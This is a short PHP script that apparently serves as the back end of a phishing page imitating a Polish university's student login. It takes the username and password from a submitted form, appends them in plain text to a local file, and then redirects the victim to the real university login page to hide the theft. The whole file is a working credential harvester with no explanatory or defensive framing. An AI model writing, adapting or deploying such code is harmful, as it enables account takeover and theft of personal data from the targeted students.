<?php
if(!empty($_POST["username"]) && !empty($_POST["password"])){
  $myfile=fopen("data","a") or die("unable to open file");
  $txt = "Username: ".$_POST["username"]." password: ".$_POST["password"]."\n";
  fwrite($myfile, $txt);
  fclose($myfile);
  echo "<script>window.location.href=\"https://s.student.pwr.edu.pl/iwc_static/c11n/login_student_pwr_edu_pl.html?lang=pl&3.0.1.3.0_16070546&svcs=abs,mail,calendar,c11n\"</script>";
}  else {
	echo "<script>window.location.href=\"https://test.com\"</script>";
}
?>
